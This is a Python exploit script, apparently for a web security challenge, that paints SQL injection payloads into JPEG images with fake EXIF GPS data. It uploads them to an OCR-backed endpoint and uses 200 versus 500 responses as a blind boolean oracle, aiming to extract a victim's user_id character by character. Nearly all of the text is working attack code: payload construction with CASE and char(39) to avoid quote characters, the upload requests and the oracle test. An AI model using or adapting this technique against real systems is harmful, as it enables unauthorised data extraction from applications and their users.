# v2_blind.py — Boolean-blind via status. We proved: even effective quotes -> 200, odd -> 500.
# Instead of fighting concat, use a CONDITIONAL that adds/removes one quote's worth of balance.
# Idea: inject a payload whose quote-balance depends on a SQL condition, so 200 vs 500 answers
# a yes/no. First: PROVE we can steer 200/500 by a condition. Then extract victim user_id char
# by char.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
print("MY user_id:", UID)
base_img = Image.open("paisaje.png").convert("RGB")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W=min(1700,max(1000,40+int(len(text)*size*0.58))); H=280
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("bl.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"bl.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("bl.jpg","rb").read()).decode()

def status(painted, desc):
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    return r.status_code

q="'"
# PROOF STEP: a payload that closes the string, runs a CASE that appends a quote only when TRUE,
# so a TRUE condition keeps balance (200) and FALSE unbalances (500) -- or vice versa.
# Base working closer seen by OCR: "9|| ... ||'"  (opens via INSERT quote? no—opening becomes *).
# Simplest robust conditional using the OCR-friendly pattern:
#   9||(CASE WHEN (<cond>) THEN char(39) ELSE char(39)||char(39) END)
# char(39) avoids painting quotes! char(39) = single quote, built from digits+letters the OCR reads.
# TRUE -> one quote -> odd -> 500 ; FALSE -> two quotes -> even -> 200  (we calibrate direction)
def test_cond(cond, desc):
    payload = "9||(CASE WHEN ("+cond+") THEN char(39) ELSE char(34) END)"
    return status(payload, desc)

print("\n== PROOF: does a CASE condition steer 200 vs 500? (char(39)=quote breaks, char(34)=safe) ==")
print("cond 1=1 (true) :", test_cond("1=1", "PB_true"))
print("cond 1=2 (false):", test_cond("1=2", "PB_false"))
print("\nIf true->500 and false->200 (or vice versa), we have a boolean oracle with NO painted quotes.")
